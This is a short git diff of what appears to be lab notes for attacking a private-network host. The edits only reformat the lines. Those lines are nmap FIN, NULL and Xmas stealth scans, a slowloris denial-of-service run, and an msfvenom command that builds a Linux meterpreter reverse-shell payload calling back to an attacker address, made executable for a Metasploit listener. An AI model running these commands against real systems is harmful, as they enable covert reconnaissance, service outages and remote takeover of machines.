@@ -47,13 +47,13 @@ Steps :-
 
 
 -> FIN Scan
-  sudo nmap -sF 192.168.100.4
+ - sudo nmap -sF 192.168.100.4
 
 
   
 
 -> NULL Scan
-  sudo nmap -sN 192.168.100.4
+- sudo nmap -sN 192.168.100.4
 
 
 
@@ -61,7 +61,7 @@ Steps :-
   
 
 -> Xmas Scan
-  sudo nmap -sX 192.168.100.4
+ - sudo nmap -sX 192.168.100.4
 
 
 
@@ -75,7 +75,7 @@ Steps :-
         cd slowloris
 
   run the attack: 
-  python3 slowloris.py 192.168.100.4
+  -> python3 slowloris.py 192.168.100.4
 
 
 
@@ -86,7 +86,7 @@ Steps :-
    
 payload creation: 
 
-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f elf >         shell.elf
+- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f elf > shell.elf
 - chmod +x shell.elf
 
 Starting Metasploit Listener: 
